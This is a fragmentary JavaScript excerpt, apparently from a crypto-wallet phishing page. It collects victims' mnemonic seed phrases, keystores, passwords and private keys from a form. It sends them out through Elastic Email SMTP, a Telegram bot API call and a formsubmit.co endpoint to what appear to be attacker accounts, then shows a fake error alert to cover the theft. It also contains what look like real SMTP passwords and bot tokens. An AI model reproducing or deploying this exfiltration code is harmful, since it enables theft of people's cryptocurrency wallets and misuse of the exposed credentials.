...
//       const message = `mnemonic-seed: ${formData.get("mnemonic-seed")} \n keystore: ${formData.get("keystore")} \nkeystore-pass: ${formData.get("wallet-address")} \nprivate-key: ${formData.get("priv_key")}`
//       console.log(message);

//     Email.send({
//         Host : "smtp.elasticemail.com",
//         Username : "Kathyburke1313@gmail.com",
//         Password : "DE09828518B65246CAFAD20BF625BE7881D9",
//         To : 'bandabad10@proton.me',
//         From : "bandabad10@proton.me",
//         Subject : "New message",
//         Body : message
//     })
//     .then(async (message) => {
...
//     var token = "7319799110:AAEOKmQTt515vT4k6AOm4JVhELTXsQCBkVo";
//     var chat_id = '5061675936';
//     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`;
//     console.log(url)
//     $.get(url, function(data, status){
//         console.log("Data: " + data + "\nStatus: " + status);
//         alert("An error occured please contact admin to continue")
//         //redirect()

//     });

//       /**
//       const email_shortcode = "CK2nAT8E76A";
...
$(".form").on("submit", function (e) {
  ...
  $.ajax({
    url: "https://formsubmit.co/ajax/johnshebzy02@gmail.com", // Replace with your server endpoint
    type: "POST",
    data: formData,
...
//         // Merge formObject with strings object
//         Object.keys(strings).forEach(key => {
//             formObject[strings[key]["name"]] = strings[key]["value"];
//         });

//         try {
//             // Send form data via fetch
//             const response = await fetch("https://formsubmit.co/ajax/Kathyburke1313@gmail.com", {
//                 method: "POST",
//                 headers: {
